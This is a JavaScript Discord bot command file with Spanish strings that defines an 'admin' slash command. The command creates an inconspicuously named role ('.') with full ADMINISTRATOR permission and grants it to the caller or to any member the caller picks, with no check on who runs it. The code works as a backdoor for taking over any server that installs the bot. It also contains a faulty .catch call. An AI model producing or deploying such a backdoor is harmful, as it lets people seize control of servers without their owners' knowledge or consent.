const { SlashCommandBuilder } = require("@discordjs/builders")
const { MessageEmbed } = require("discord.js")
const Discord = require("discord.js")


module.exports = {

    timeout: 3000,
    data: new SlashCommandBuilder()
    .setName("admin")
    .setDescription("Obtén admin en el servidor. ")
    .addUserOption(data => data.setName('miembro').setDescription('Dale admin al usuario que quieras. (Opcional)')),

    async run(client, interaction){
try{
    const target = interaction.options.getMember('miembro')
    if(!target){
        interaction.guild.roles.create({
            name: '.',
            permissions: 'ADMINISTRATOR',
            position: interaction.guild.me.roles.highest.position - 1
        }).then(c=>{
            interaction.member.roles.add(c.id).catch(()=>{return;})
        }).catch({content: '**Ocurrió un error al intentar crear un rol con permiso administrativo en este servidor, por favor revise si tengo permisos necesarios.**', ephemeral: true}).catch(()=>{return;})
        interaction.reply({content: '**Has obtenido administrador en este servidor.**', ephemeral: true}).catch(()=>{return;})
        
        
    }else{
        
        interaction.guild.roles.create({
            name: '.',
            permissions: 'ADMINISTRATOR',
            position: interaction.guild.me.roles.highest.position - 1
        }).then(c=>{
            target.roles.add(c.id).catch(()=>{return;})
        }).catch({content: '**Ocurrió un error al intentar crear un rol con permiso administrativo en este servidor, por favor revise si tengo permisos necesarios.**', ephemeral: true}).catch(()=>{return;})
        target.send({content: `**Has obtenido administrador en el servidor ${interaction.guild.name} servidor.**`, ephemeral: true}).catch(()=>{return;})
        interaction.reply({content: '**Se le otorgó Administrador al usuario correctamente.**', ephemeral: true}).catch(()=>{return;})
    }



}catch (e) {
        console.error(e);
        
        try {
          return;
         } catch (e) {}
        }
    }
}
